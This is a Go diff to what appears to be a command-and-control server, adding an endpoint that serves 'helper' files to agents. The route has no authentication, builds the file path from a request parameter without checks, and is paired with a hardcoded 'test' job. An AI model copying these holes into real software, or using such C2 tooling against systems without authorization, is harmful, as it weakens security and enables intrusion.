@@ -109,6 +109,7 @@ func (c2s *C2Server) setupRouter() (*gin.Engine, error) {
 		agent.POST("/jobs/update", c2s.updateJobStatusHandler)
 		agent.POST("/logs/add", c2s.addLogsHandler)
 	}
+	r.GET("/helpers/:job-uuid/:helper-filename", c2s.helperHandler)
 
 	authOperatorMiddleware, err := c2s.initOperatorJWTMiddleware()
 	if err != nil {
@@ -291,6 +292,27 @@ func (c2s *C2Server) addLogsHandler(c *gin.Context) {
 	}
 }
 
+func (c2s *C2Server) helperHandler(c *gin.Context) {
+	jobUuid := c.Param("job-uuid")
+	helperFilename := c.Param("helper-filename")
+	jobFound := false
+	for _, someAgentJobs := range c2s.activeJobs {
+		for _, job := range someAgentJobs {
+			if job == jobUuid {
+				jobFound = true
+			}
+		}
+	}
+	if jobFound {
+		helperPath := filepath.Join("data/c2/helpers/", helperFilename)
+		c.Header("Content-Description", "File Transfer")
+		c.Header("Content-Transfer-Encoding", "binary")
+		c.Header("Content-Disposition", "attachment; filename="+helperFilename)
+		c.Header("Content-Type", "application/octet-stream")
+		c.File(helperPath)
+	}
+}
+
 func (c2s *C2Server) initOperatorJWTMiddleware() (*jwt.GinJWTMiddleware, error) {
 	c2s.operatorIdentityKey = "id"
 	secret := util.RandString(256)
@@ -449,6 +471,7 @@ func (c2s *C2Server) getAllAgentLogsHandler(c *gin.Context) {
 }
 
 func (c2s *C2Server) Run() error {
+	c2s.activeJobs["test"] = []string{"test"}
 	err := c2s.r.RunTLS(c2s.host+":"+c2s.port, "data/c2/"+c2s.host+".crt", "data/c2/"+c2s.host+".key")
 	if err != nil {
 		return fmt.Errorf("\ncan't start an HTTP server: %v", err)
